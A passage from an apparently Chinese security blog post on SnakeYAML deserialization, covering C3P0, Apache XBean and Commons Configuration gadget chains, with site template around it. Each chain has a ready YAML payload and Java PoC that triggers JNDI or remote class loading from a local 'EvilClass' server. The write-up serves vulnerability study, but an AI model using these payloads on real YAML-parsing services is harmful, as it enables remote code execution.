+    &#x2F;&#x2F; 用来序列化数据，将序列化后的字节数组返回
+    public static byte[] tobyteArray(Object o) throws IOException &#123;
+        ByteArrayOutputStream bao &#x3D; new ByteArrayOutputStream();
+        ObjectOutputStream oos &#x3D; new ObjectOutputStream(bao);
+        oos.writeObject(o);
+        return bao.toByteArray();
+    &#125;
+    &#x2F;&#x2F; 将字节数组编码成 HexAscii 格式的字符串
+    public static String toHexAscii(byte[] bytes)&#123;
+        int len &#x3D; bytes.length;
+        StringWriter sw &#x3D; new StringWriter(len * 2);
+        for (int i &#x3D; 0; i &lt; len; ++i) &#123;
+            addHexAscii(bytes[i], sw);
+        &#125;
+        return sw.toString();
+    &#125;
+
+    public static void main(String[] args) throws ClassNotFoundException, InvocationTargetException, NoSuchMethodException, InstantiationException, IllegalAccessException, IOException &#123;
+        String hex &#x3D; toHexAscii(tobyteArray(exp()));
+        String poc &#x3D; &quot;!!com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\n&quot; +
+                     &quot;  userOverridesAsString: HexAsciiSerializedMap:&quot;+ hex + &quot;;&quot;;
+        Yaml yaml &#x3D; new Yaml();
+        yaml.load(poc);
+    &#125;
+&#125;</code></pre>
+
+<p>‍</p>
+<h3 id="C3P0-JndiRefForwardingDataSource"><a href="#C3P0-JndiRefForwardingDataSource" class="headerlink" title="C3P0 JndiRefForwardingDataSource"></a>C3P0 JndiRefForwardingDataSource</h3><p>这个的分析就相对好找一点，都在一个类中</p>
+<p>直接搜索 <code>lookup</code>​ 方法，可以找到就一个 <code>dereference</code>​ 方法实现了，需要的参数是 <code>jndiName</code></p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/20251004144104.png" alt="image"></p>
+<p>找这个方法的用法，只有一个 <code>inner</code> 方法调用了</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/20251004144152.png" alt="image"></p>
+<p>继续找，我们只关注 <code>setter</code>​ 方法，最后测试是 <code>loginTimeout</code> 成功了</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/20251004144233.png" alt="image"></p>
+<p><strong>payload</strong></p>
+<pre class="line-numbers language-yaml" data-language="yaml" data-start="1"><code class="language-yaml">!!com.mchange.v2.c3p0.JndiRefForwardingDataSource
+  jndiName: ldap:&#x2F;&#x2F;127.0.0.1:8003&#x2F;EvilClass
+  loginTimeout: 0</code></pre>
+
+<h4 id="调用链-4"><a href="#调用链-4" class="headerlink" title="调用链"></a>调用链</h4><pre class="line-numbers language-java" data-language="java" data-start="1"><code class="language-java">JndiRefForwardingDataSource#setLoginTimeout(int)
+- JndiRefForwardingDataSource#inner()
+-- JndiRefForwardingDataSource#dereference()
+---  InitialContext#lookup(String)</code></pre>
+
+<h4 id="测试实现-4"><a href="#测试实现-4" class="headerlink" title="测试实现"></a>测试实现</h4><pre class="line-numbers language-java" data-language="java" data-start="1"><code class="language-java">import org.yaml.snakeyaml.Yaml;
+
+public class Poc &#123;
+    public static void main(String[] args) &#123;
+        String poc &#x3D; &quot;!!com.mchange.v2.c3p0.JndiRefForwardingDataSource\n&quot; +
+                &quot;  jndiName: ldap:&#x2F;&#x2F;127.0.0.1:8003&#x2F;EvilClass\n&quot; +
+                &quot;  loginTimeout: 0\n&quot;;
+        Yaml yaml &#x3D; new Yaml();
+        yaml.load(poc);
+    &#125;
+&#125;</code></pre>
+
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/20251004145030.png" alt="image"></p>
+<p>‍</p>
+<h3 id="Apache-XBean"><a href="#Apache-XBean" class="headerlink" title="Apache XBean"></a>Apache XBean</h3><p>依赖</p>
+<pre class="line-numbers language-markup" data-language="markup" data-start="1"><code class="language-markup">&lt;dependency&gt;
+    &lt;groupId&gt;org.apache.xbean&lt;&#x2F;groupId&gt;
+    &lt;artifactId&gt;xbean-naming&lt;&#x2F;artifactId&gt;
+    &lt;version&gt;4.26&lt;&#x2F;version&gt;
+&lt;&#x2F;dependency&gt;</code></pre>
+
+<p>这个链的触发条件在构造方法 <code>BadAttributeValueExpException</code>​ 中，这里可以传入一个类，去触发这个类的 <code>toString</code> 方法</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/20251004145705.png" alt="image"></p>
+<p>这里是跟着调用链走的，这个感觉完全看不来（</p>
+<p>这里在导入的依赖中有一个类 <code>ContextUtil</code>​，在这个类中有一个内部类 <code>ReadOnlyBinding</code>​ ，继承了 <code>Binding</code>​ 类，所以可以触发这个 <code>toString</code>​ 方法，然后会触发这个 <code>getObject</code> 方法</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/20251004151614.png" alt="image"></p>
+<p>这里会利用这个类的有参构造器，传入这些参数</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/20251004161902.png" alt="image"></p>
+<p>这个方法在内部类中重写了 <code>getObject</code> 方法，并且将里面的参数都传入</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/20251004151732.png" alt="image"></p>
+<p>跟进去 <code>resolve</code>​ 方法，这里将传入的 <code>value</code>​ 转化成一个 <code>Reference</code>​ 对象，然后传入 <code>getObjectInstance</code> 方法</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/20251004151819.png" alt="image"></p>
+<p><code>getObjectInstance</code>​ 方法会在这里还是在调用这个 <code>Reference</code>​ 的 <code>getObjectFactoryFromReference</code> 方法</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/20251004162204.png" alt="image"></p>
+<p>再跟进去就能发现这里在加载一个类了</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/20251004162302.png" alt="image"></p>
+<p>‍</p>
+<p><strong>payload</strong></p>
+<p>这里利用的是 JNDI 的 <code>Reference</code> 去远程类加载</p>
+<pre class="line-numbers language-yaml" data-language="yaml" data-start="1"><code class="language-yaml">!!javax.management.BadAttributeValueExpException [
+  !!org.apache.xbean.naming.context.ContextUtil$ReadOnlyBinding [
+    marin,
+    !!javax.naming.Reference [marin,EvilClass,http:&#x2F;&#x2F;127.0.0.1:8002&#x2F;],
+    !!org.apache.xbean.naming.context.WritableContext []
+  ]
+]</code></pre>
+
+<h4 id="调用链-5"><a href="#调用链-5" class="headerlink" title="调用链"></a>调用链</h4><pre class="line-numbers language-java" data-language="java" data-start="1"><code class="language-java">BadAttributeValueExpException#BadAttributeValueExpException(Object)
+- Binding#toString
+&#x2F;&#x2F; 这个是内部类的写法，继承了 Binding
+-- ContextUtil$ReadOnlyBinding#getObject()
+--- ContextUtil#resolve(Object,String,Name,Context)
+---- NamingManager#getObjectInstance(Object,Name,Context,Hashtable&lt;?,?&gt;)
+----- NamingManager#getObjectFactoryFromReference(Reference,String)
+&#x2F;&#x2F; 这里的 18 是版本特定的类加载器实现
+------ VersionHelper18#loadClass(String,String)
+------- VersionHelper18#loadClass(String,ClassLoader)
+-------- Class#forName(String,boolean,ClassLoader)</code></pre>
+
+<h4 id="测试实现-5"><a href="#测试实现-5" class="headerlink" title="测试实现"></a>测试实现</h4><pre class="line-numbers language-java" data-language="java" data-start="1"><code class="language-java">public class Poc &#123;
+    public static void main(String[] args) &#123;
+        String poc &#x3D; &quot;!!javax.management.BadAttributeValueExpException [\n&quot; +
+                &quot;  !!org.apache.xbean.naming.context.ContextUtil$ReadOnlyBinding [\n&quot; +
+                &quot;    marin,\n&quot; +
+                &quot;    !!javax.naming.Reference [marin,EvilClass,http:&#x2F;&#x2F;127.0.0.1:8002&#x2F;],\n&quot; +
+                &quot;    !!org.apache.xbean.naming.context.WritableContext []\n&quot; +
+                &quot;  ]\n&quot; +
+                &quot;]&quot;;
+        Yaml yaml &#x3D; new Yaml();
+        yaml.load(poc);
+    &#125;
+&#125;</code></pre>
+
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/20251004162410.png" alt="image"></p>
+<p>‍</p>
+<h3 id="Apache-Commons-Configuration"><a href="#Apache-Commons-Configuration" class="headerlink" title="Apache Commons Configuration"></a>Apache Commons Configuration</h3><p>依赖</p>
+<pre class="line-numbers language-markup" data-language="markup" data-start="1"><code class="language-markup">&lt;dependency&gt;
+    &lt;groupId&gt;commons-configuration&lt;&#x2F;groupId&gt;
+    &lt;artifactId&gt;commons-configuration&lt;&#x2F;artifactId&gt;
+    &lt;version&gt;1.10&lt;&#x2F;version&gt;
+&lt;&#x2F;dependency&gt;</code></pre>
+
+<p>这里要用到的类是 <code>ConfigurationMap</code>​，他有一个父类是 <code>AbstractMap</code>​，这个类实现了一个 <code>hashcode</code>​ 方法，而在  <code>SnakeYaml</code>​ 中，构造 Map 类型的类时，会调用 <code>hashcode</code> 来判断 key 值是否重复</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/20251004165734.png" alt="image"></p>
+<p>这里的 <code>entryset</code>​ 会返回一个内部类 <code>ConfigurationSet</code>​ ，然后触发他的 <code>iterator</code> </p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/20251004170218.png" alt="image"></p>
+<p>这里又会返回一个内部类 <code>ConfigurationSetIterator</code></p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/20251004170310.png" alt="image"></p>
+<p>我们可以发现这个类的构造函数调用了 <code>configuration</code>​ 的 <code>getKeys</code>​ 方法，这个 <code>configuration</code> 就是我们传入的数据</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/20251004170507.png" alt="image"></p>
+<p>这后面就是 payload 传入了一个 <code>JNDIConfiguration</code>​ ，看到他的 <code>getKeys</code> 方法</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/20251004170626.png" alt="image"></p>
+<p>这里触发了一个 <code>getBaseContext</code>​ 方法，已经出现 <code>lookup</code> 了</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/20251004171054.png" alt="image"></p>
+<p>这里要触发 <code>JNDIConfiguration</code>​ 能传入 <code>context</code>​ 的构造方法，传入一个 <code>InitialContext</code>​ 类进去触发 <code>lookup</code></p>
+<p><strong>payload</strong></p>
+<p>这里是创建了一个 map 对象，最后的 <code>: 1</code> 就是这个 map 的值</p>
+<p>这里必须要用一句话的形式，分多行会无法识别最后的 <code>: 1</code> 报错</p>
+<pre class="line-numbers language-yaml" data-language="yaml" data-start="1"><code class="language-yaml">!!org.apache.commons.configuration.ConfigurationMap [!!org.apache.commons.configuration.JNDIConfiguration [!!javax.naming.InitialContext [],ldap:&#x2F;&#x2F;127.0.0.1:8003&#x2F;EvilClass]]: 1</code></pre>
+
+<h4 id="调用链-6"><a href="#调用链-6" class="headerlink" title="调用链"></a>调用链</h4><pre class="line-numbers language-java" data-language="java" data-start="1"><code class="language-java">&#x2F;&#x2F; 其实调用的是父类的这个方法
+ConfigurationMap#hashCode()
+- ConfigurationMap#entrySet()
+-- ConfigurationMap$ConfigurationSet#iterator()
+--- ConfigurationMap$ConfigurationSet$ConfigurationSetIterator#ConfigurationSetIterator()
+---- JNDIConfiguration#getKeys()
+----- JNDIConfiguration#getKeys(String)
+------ JNDIConfiguration#getBaseContext()
+------- JNDIConfiguration#getContext()
+-------- InitialContext#lookup()</code></pre>
+
+<h4 id="测试实现-6"><a href="#测试实现-6" class="headerlink" title="测试实现"></a>测试实现</h4><pre class="line-numbers language-java" data-language="java" data-start="1"><code class="language-java">public class Poc &#123;
+    public static void main(String[] args) &#123;
+        String poc &#x3D; &quot;!!org.apache.commons.configuration.ConfigurationMap [!!org.apache.commons.configuration.JNDIConfiguration [!!javax.naming.InitialContext [],ldap:&#x2F;&#x2F;127.0.0.1:8003&#x2F;EvilClass]]: 1&quot;;
+        Yaml yaml &#x3D; new Yaml();
+        yaml.load(poc);
+    &#125;
+&#125;
+</code></pre>
+
+<p>就是这里一下会重复 4 次（</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/20251004172114.png" alt="image"></p>
+<p>‍</p>
+<p>‍</p>
+<p>Jetty Resource</p>
+<p>依赖</p>
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">Marin</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://wwwmarin.xyz/2026/01/13/snakeyaml-fan-xu-lie-hua/">https://wwwmarin.xyz/2026/01/13/snakeyaml-fan-xu-lie-hua/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">Marin</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/web/">
+                                    <span class="chip bg-color">web</span>
+                                </a>
+                            
+                                <a href="/tags/java/">
+                                    <span class="chip bg-color">java</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+                <div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fas fa-times"></i></a>
+            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/2026/01/13/http-qing-qiu-zou-si/">
+                    <div class="card-image">
+                        
+                        <img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/95662111_p0.jpg" class="responsive-img" alt="HTTP 请求走私">
+                        
+                        <span class="card-title">HTTP 请求走私</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2026-01-13
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/WEB/" class="post-category">
+                                    WEB
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/web/">
+                        <span class="chip bg-color">web</span>
+                    </a>
+                    
+                    <a href="/tags/%E6%BC%8F%E6%B4%9E/">
+                        <span class="chip bg-color">漏洞</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2026/01/13/fastjson-fan-xu-lie-hua/">
+                    <div class="card-image">
+                        
+                        <img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/6sy0rziperl34psjub73jhxi0.jpg" class="responsive-img" alt="Fastjson 反序列化">
+                        
+                        <span class="card-title">Fastjson 反序列化</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2026-01-13
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/" class="post-category">
+                                    学习记录
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/web/">
+                        <span class="chip bg-color">web</span>
+                    </a>
+                    
+                    <a href="/tags/java/">
+                        <span class="chip bg-color">java</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+
+  <!-- 是否加载使用自带的 prismjs. -->
+  <script type="text/javascript" src="/libs/prism/prism.min.js"></script>
+
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4, h5, h6'
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+
+    <div class="container row center-align"
+         style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2019-2026</span>
+            
+            <a href="/about" target="_blank">Marin</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            
+            <br>
+            
+            
+            
+                
+            
+            
+                <span id="busuanzi_container_site_pv">
+                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
+                    <span id="busuanzi_value_site_pv" class="white-color"></span>
+            </span>
+            
+            
+                <span id="busuanzi_container_site_uv">
+                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
+                    <span id="busuanzi_value_site_uv" class="white-color"></span>
+            </span>
+            
+            <br>
+
+            <!-- 运行天数提醒. -->
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 白天和黑夜主题 -->
+<div class="stars-con">
+    <div id="stars"></div>
+    <div id="stars2"></div>
+    <div id="stars3"></div>  
+</div>
+
+<script>
+    function switchNightMode() {
+        $('<div class="Cuteen_DarkSky"><div class="Cuteen_DarkPlanet"></div></div>').appendTo($('body')),
+        setTimeout(function () {
+            $('body').hasClass('DarkMode') 
+            ? ($('body').removeClass('DarkMode'), localStorage.setItem('isDark', '0'), $('#sum-moon-icon').removeClass("fa-sun").addClass('fa-moon')) 
+            : ($('body').addClass('DarkMode'), localStorage.setItem('isDark', '1'), $('#sum-moon-icon').addClass("fa-sun").removeClass('fa-moon')),
+            
+            setTimeout(function () {
+            $('.Cuteen_DarkSky').fadeOut(1e3, function () {
+                $(this).remove()
+            })
+            }, 2e3)
+        })
+    }
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    
+
+    
+    
+    
+
+    <!-- 雪花特效 -->
+    
+
+    <!-- 鼠标星星特效 -->
+    
+
+     
+        <script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
+        <script src="/libs/others/TencentCaptcha.js"></script>
+        <button id="TencentCaptcha" data-appid="xxxxxxxxxx" data-cbfn="callback" type="button" hidden></button>
+    
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    <!--腾讯兔小巢-->
+    
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
